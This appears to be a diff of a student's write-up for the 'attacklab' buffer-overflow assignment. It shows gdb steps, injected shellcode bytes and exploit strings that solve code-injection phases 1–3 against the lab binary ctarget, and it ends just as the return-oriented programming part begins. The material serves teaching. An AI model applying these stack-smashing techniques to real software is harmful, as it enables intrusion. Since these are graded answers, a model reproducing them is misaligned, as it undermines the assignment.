@@ -1,6 +1,6 @@
 # attacklab
 
-## Table of contents
+##Table of contents
 
 * [File Introduction](#file)
 * [Commands](#commands)
@@ -8,6 +8,8 @@
   * [phase 1](#phase1)
   * [phase 2](#phase2)
   * [phase 3](#phase3)
+* [Part II: Return-Oriented Programming](#part2)
+  * [phase 4](#phase4)
 
 <h2 id = "file">File introduction</h2>
 
@@ -108,7 +110,7 @@ Run ctarget executable in gdb and set a breakpoint at getbuf
 ```shell
 gdb ctarget
 (gdb) break getbuf
-(gdb) run -q
+(gdb) run -q         # -q: Don’t send results to the server
 ```
 
 Then disasemble the getbuf function 
@@ -130,17 +132,17 @@ Dump of assembler code for function getbuf:
 End of assembler dump.
 ```
 
-The codes ` sub $0x18,%rsp`  indicates that 24(0x18) bytes of buffer is allocated for getbuf. So we need to input 24 bytes of padding followed by the return address of the touch1. 
+The code ` sub $0x18,%rsp`  indicates that 24(0x18) bytes of buffer is allocated for getbuf. So we need to input 24 bytes of padding followed by the return address of the touch1. 
 
 To find the address the touch1, we need to get the disassembled code.
 
 ```
-(gdb) dissassemble touch1
+(gdb) disassemble touch1
 ```
 
  Then we get codes which looked like
 
-```
+```assembly
 Dump of assembler code for function touch1:
    0x0000555555555965 <+0>:	sub    $0x8,%rsp
    0x0000555555555969 <+4>:	movl   $0x1,0x202b69(%rip)        # 0x5555557584dc <vlevel>
@@ -166,7 +168,7 @@ Finally create a text file named atk1.txt which will look like below
 
 ```
 00 00 00 00 00 00 00 00
-00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00    /* */
 00 00 00 00 00 00 00 00    /* the first 24 padding bytes */
 65 59 55 55 55 55 00 00    /* address of touch1 */
 ```
@@ -180,7 +182,7 @@ Now run this file through the program hex2raw, which  generates raw exploit stri
 
 ./ctarget < atk1r.txt             # use I/O redirection
 
-unix> gdb ctarget                 # within GDB
+gdb ctarget                 # within GDB
 (gdb) run < atk1r.txt
 ```
 
@@ -218,8 +220,8 @@ however, we must make it appear to touch2 as if we have passed your cookie as it
 
 As what we did in phase1, we need to run ctarget executable in gdb and set a breakpoint at getbuf and get the disassembled code of touch2
 
-```
-(gdb) dissassemble touch2
+```assembly
+(gdb) disassemble touch2
 Dump of assembler code for function touch2:
    0x0000555555555993 <+0>:	sub    $0x8,%rsp
    0x0000555555555997 <+4>:	mov    %edi,%esi
@@ -242,3 +244,212 @@ Dump of assembler code for function touch2:
 End of assembler dump.
 ```
 
+Our goal is to modify the %rdi register and store the cookie in it. We need some assembly code for the task.
+
+Create a file called atk2.s and write the code below with your own cookie
+
+```assembly
+movq $0x5f5bd74e,%rdi           /* move the cookie into register %rdi */
+retq                             /* return */
+```
+
+Now we need the byte representation of the code above. Compile it with gcc then dissasemble it
+
+```shell
+gcc -c atk2.s
+objdump -d atk2.o
+```
+
+ Then we get codes like below
+
+```assembly
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	48 c7 c7 4e d7 5b 5f 	mov    $0x5f5bd74e,%rdi
+   7:	c3                   	retq  
+```
+
+In order to execute our code, we need to find the address of %rsp(the start address of our input) and replace the address in the return statement with it. We can use GDB to find the address of %rsp 
+
+```
+gdb ctarget
+(gdb) break getbuf
+(gdb) run -q
+```
+
+Now do `disas` and we can get
+
+```
+Dump of assembler code for function getbuf:
+=> 0x000055555555594f <+0>:	sub    $0x18,%rsp
+   0x0000555555555953 <+4>:	mov    %rsp,%rdi
+   0x0000555555555956 <+7>:	callq  0x555555555b9f <Gets>
+   0x000055555555595b <+12>:	mov    $0x1,%eax
+   0x0000555555555960 <+17>:	add    $0x18,%rsp
+   0x0000555555555964 <+21>:	retq   
+End of assembler dump.
+```
+
+We need to run the code until the instruction just below `callq  0x555555555b9f <Gets>` . Use `until *addr`
+
+```
+until *0x000055555555595b
+```
+
+It will ask to type a string.  Type a random string and do `x/s $rsp`, then get something like 
+
+```
+(gdb) x/s $rsp
+0x5566fce8:	"asdasd"             # the random string I typed
+```
+
+ `0x5566fce8` is the address of register %rsp.
+
+Get the address of touch 2
+
+```
+(gdb) p touch2
+$1 = {void (unsigned int)} 0x555555555993 <touch2>
+```
+
+Now we can write our attack file. Create a file named atk2.txt and reverse the bytes for little-endian.
+
+```
+48 c7 c7 4e d7 5b 5f c3          /* store cookie in %rdi */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00          /* padding to fill 24 bytes */
+e8 fc 66 55 00 00 00 00          /* address of register %rsp */
+93 59 55 55 55 55 00 00          /* address of function touch2 */
+```
+
+ Finally run the file
+
+```
+./hex2raw < atk2.txt > atk2r.txt
+
+./ctarget < atk2r.txt             # use I/O redirection
+
+gdb ctarget                 # within GDB
+(gdb) run < atk2r.txt
+```
+
+What the exploit does is that after we enter the string  when Gets tries to return, it is forced to point to the address in %rsp by the overflow code so it will execute codes which set our cookie as the parameter and then call touch2.
+
+```
+Cookie: 0x5f5bd74e
+Type string:Touch2!: You called touch2(0x5f5bd74e)
+Valid solution for level 2 with target ctarget
+PASS: Sent exploit string to server to be validated.
+NICE JOB!
+```
+
+<h3 id = "phase3">Phase 3</h3>
+
+Within the file ctarget there is code for functions hexmatch and touch3 having the following C representations:
+
+```c
+/* Compare string to hex represention of unsigned value */
+int hexmatch(unsigned val, char *sval){
+	char cbuf[110];
+	/* Make position of check string unpredictable */
+	char *s = cbuf + random() % 100;
+	sprintf(s, "%.8x", val);
+	return strncmp(sval, s, 9) == 0;
+}
+
+void touch3(char *sval){
+	vlevel = 3; /* Part of validation protocol */
+	if (hexmatch(cookie, sval)) {
+		printf("Touch3!: You called touch3(\"%s\")\n", sval);
+		validate(3);
+	} else {
+		printf("Misfire: You called touch3(\"%s\")\n", sval);
+		fail(3);
+	}
+	exit(0);
+}
+```
+
+The task is similar to phase 2 except that we need to call touch3 and pass the address of our cookie string to %rdi.
+
+Because the functions hexmatch and strncmp may overwrite portions of memory that held the buffer used by getbuf, the cookie string has to be stored at a safe place. We can store it after touch3.
+
+The total bytes before the cookie are `buffer + 8 bytes for return address of rsp + 8 bytes for touch3` , that is `0x18 + 8 + 8 = 28` (40 Decimal)
+
+In phase 2 we know %rsp points `0x5566fce8`. Add the bias `0x5566fce8 + 0x28 = 0x5566fd10`. Then we can write the code and generate the byte representation
+
+```
+movq $0x5566fd10,%rdi /* %rsp + 0x28 */
+retq
+```
+
+Disassemble it
+
+```
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	48 c7 c7 10 fd 66 55 	mov    $0x5566fd10,%rdi
+   7:	c3                   	retq   
+```
+
+Get the address of touch3
+
+```
+(gdb) p touch3
+$1 = {void (char *)} 0x555555555a6e <touch3>
+```
+
+We can transfer our cookie into hex format according to ASCII table
+
+```
+man ascii
+```
+
+We can know 0x5f5bd74e → 35 66 35 62 64 37 34 65 
+
+Now we can create atk3.txt
+
+```
+48 c7 c7 10 fd 66 55 c3         /* pass the address of cookie to %rdi */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00         /* padding */
+e8 fc 66 55 00 00 00 00         /* return (%rsp) */
+6e 5a 55 55 55 55 00 00         /* the address of touch3 */
+35 66 35 62 64 37 34 65         /* cookie string*/
+```
+
+Generate the raw exploit string and check the answer
+
+```
+./hex2raw < atk3.txt > atk3r.txt
+
+./ctarget < atk3r.txt             # use I/O redirection
+
+gdb ctarget                 # within GDB
+(gdb) run < atk3r.txt
+```
+
+```
+Cookie: 0x5f5bd74e
+Type string:Touch3!: You called touch3("5f5bd74e")
+Valid solution for level 3 with target ctarget
+PASS: Sent exploit string to server to be validated.
+NICE JOB!
+```
+
+<h2 id = "part2">Part II: Return-Oriented Programming</h2>
+
+> Performing code-injection attacks on program RTARGET is much more difficult than it is for CTARGET,
+> because it uses two techniques to thwart such attacks:
+>
+> * It uses randomization so that the stack positions differ from one run to another. This makes it impossibleto determine where your injected code will be located.
+> * It marks the section of memory holding the stack as nonexecutable, so even if you could set the
+>   program counter to the start of your injected code, the program would fail with a segmentation fault.
+>
+> The solution for this is to use ROP (Return Oriented Programming). What ROP does is that since we can't execute our own code, we will look for instructions in the code that do the same thing as what we want. These are called gadgets and by combining these gadgets, we will be able to perform our exploit. 
+
+<h3 id = "phase4">Phase 4</h3>
+
+This phase is the same as phase 2 except using different method to call touch2 and pass the cookie. 
